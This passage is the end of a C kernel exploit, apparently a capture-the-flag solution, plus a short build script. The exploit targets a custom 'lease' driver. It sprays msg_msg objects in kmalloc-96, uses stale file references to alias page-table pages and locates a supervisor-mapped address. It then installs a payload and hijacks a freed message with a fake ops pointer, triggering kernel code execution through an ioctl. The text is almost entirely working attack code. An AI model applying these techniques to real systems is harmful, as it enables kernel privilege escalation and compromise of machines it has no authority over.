    for (unsigned word = 0; word < 6; word++)
        message.data[word] = MARKER;
    for (unsigned queue = 0; queue < MSG_QUEUES; queue++) {
        for (unsigned index = 0; index < MSGS_PER_QUEUE; index++) {
            message.type = (long)index + 1;
            if (msgsnd(queues[queue], &message, sizeof(message.data),
                       IPC_NOWAIT) != 0)
                die("msgsnd spray");
        }
    }
    dprintf(1, "[*] phase B: sprayed %u kmalloc-96 messages\n",
            MSG_QUEUES * MSGS_PER_QUEUE);

    /* Allocate the second slab population before any stale bit-clears. */
    dprintf(1, "[*] phase A: allocating %u objects, %u PTE references\n",
            LEASE_OBJECTS, STALE_REFS);
    for (unsigned i = 0; i < LEASE_OBJECTS; i++)
        object_ids[i] = lease_create(control_fd);
    unsigned pte_count = 0;
    for (unsigned group = 0; group < SLAB_COUNT; group++) {
        for (unsigned ref = 0; ref < REFS_PER_SLAB; ref++) {
            unsigned i = group * SLOTS_PAGE + ref;
            pte_fds[pte_count] = lease_open();
            lease_acquire(pte_fds[pte_count], object_ids[i]);
            pte_count++;
        }
    }
    for (unsigned i = 0; i < LEASE_OBJECTS; i++)
        lease_destroy(control_fd, object_ids[i]);

    /* Each first touch allocates a target PTE page; all data is pre-existing. */
    for (unsigned group = 0; group < PTE_GROUPS; group++) {
        uintptr_t group_base = PT_BASE + (uintptr_t)group * PMD_SIZE_;
        for (unsigned slot = 0; slot < SLOTS_PAGE; slot++) {
            volatile uint8_t *alias =
                (volatile uint8_t *)(group_base + (uintptr_t)slot * 0x10000UL);
            (void)*alias;
        }
    }
    dprintf(1, "[*] phase A: faulted %u candidate PTE pages\n", PTE_GROUPS);

    /*
     * Probe one object per likely-released slab first.  A data-page hit turns
     * MARKER (..04) into MARKER_CLEAR (..00), and its paired fd remains live.
     */
    struct message_hit hit = {0};
    int matched = 0;
    int trigger_fd = -1;
    unsigned matched_index = 0;
    unsigned attempts = 0;
    unsigned char *closed = calloc(STALE_REFS, 1);
    if (!closed)
        die("calloc closed");

    for (unsigned pass = 0; pass < 2 && !matched; pass++) {
        unsigned start = pass == 0 ? 13 : 0;
        unsigned end = pass == 0 ? SLAB_COUNT : 13;
        for (unsigned group = start; group < end && !matched; group++) {
            unsigned i = group * REFS_PER_SLAB;
            if (close(pairs[i].probe_fd) != 0)
                die("close data probe");
            pairs[i].probe_fd = -1;
            closed[i] = 1;
            attempts++;
            matched = find_cleared_message(queues, &hit);
            if (matched) {
                trigger_fd = pairs[i].trigger_fd;
                matched_index = i;
            }
        }
    }
    for (unsigned i = 0; i < STALE_REFS && !matched; i++) {
        if (closed[i])
            continue;
        if (close(pairs[i].probe_fd) != 0)
            die("close data probe fallback");
        pairs[i].probe_fd = -1;
        closed[i] = 1;
        attempts++;
        matched = find_cleared_message(queues, &hit);
        if (matched) {
            trigger_fd = pairs[i].trigger_fd;
            matched_index = i;
        }
    }
    if (!matched) {
        errno = ENOENT;
        die("no reclaimed data-page alias");
    }
    dprintf(1, "[+] msg match after %u probes: object=%u queue=%u index=%u word=%u\n",
            attempts, matched_index, hit.queue, hit.index, hit.word);

    /* No lease allocations occur after this point; freelist damage is safe. */
    for (unsigned i = 0; i < STALE_REFS; i++) {
        if (!closed[i]) {
            close(pairs[i].probe_fd);
            pairs[i].probe_fd = -1;
        }
    }
    for (unsigned i = 0; i < STALE_REFS; i++) {
        close(pte_fds[i]);
        pte_fds[i] = -1;
    }

    struct sigaction action;
    memset(&action, 0, sizeof(action));
    action.sa_sigaction = fault_handler;
    action.sa_flags = SA_SIGINFO | SA_NODEFER;
    sigemptyset(&action.sa_mask);
    if (sigaction(SIGSEGV, &action, NULL) != 0)
        die("sigaction");

    pin_cpu(1); /* CPU 1 has no stale user TLB entries for the aliases. */
    uintptr_t supervisor = 0;
    unsigned checked = 0;
    for (unsigned group = 0; group < PTE_GROUPS && !supervisor; group++) {
        uintptr_t group_base = PT_BASE + (uintptr_t)group * PMD_SIZE_;
        for (unsigned slot = 0; slot < SLOTS_PAGE; slot++) {
            uintptr_t alias = group_base + (uintptr_t)slot * 0x10000UL;
            checked++;
            if (!user_readable((volatile unsigned char *)alias)) {
                supervisor = alias;
                break;
            }
        }
    }
    if (!supervisor) {
        errno = ENOENT;
        die("no supervisor alias");
    }
    dprintf(1, "[+] supervisor alias=%#lx after %u checks\n",
            (unsigned long)supervisor, checked);

    install_payload(code_rw, supervisor, cfi_hash);
    uintptr_t fake_ops = supervisor + 0x100;

    /*
     * Messages were sprayed on CPU 0.  Free/reallocate the matched message
     * there so the per-CPU kmalloc-96 freelist returns the exact stale slot.
     * Return to CPU 1 before FLUSH: only CPU 1 lacks the stale user TLB entry.
     */
    pin_cpu(0);
    replace_message(queues[hit.queue], &hit, fake_ops | 4ULL);
    __sync_synchronize();
    pin_cpu(1);

    dprintf(1, "[*] FLUSH trigger fd=%d fake_ops=%#lx target=%#lx\n",
            trigger_fd, (unsigned long)fake_ops,
            (unsigned long)(supervisor + 0x200));
    if (ioctl(trigger_fd, LE_FLUSH, 0) != 0)
        die("LE_FLUSH trigger");

    print_flag();
    return 0;
}
```

#### `build.sh`

```sh
#!/bin/sh
set -eu

CC="${CC:-gcc}"
"$CC" -O2 -static -Wall -Wextra -Werror -o exploit exploit.c
sha256sum exploit
```
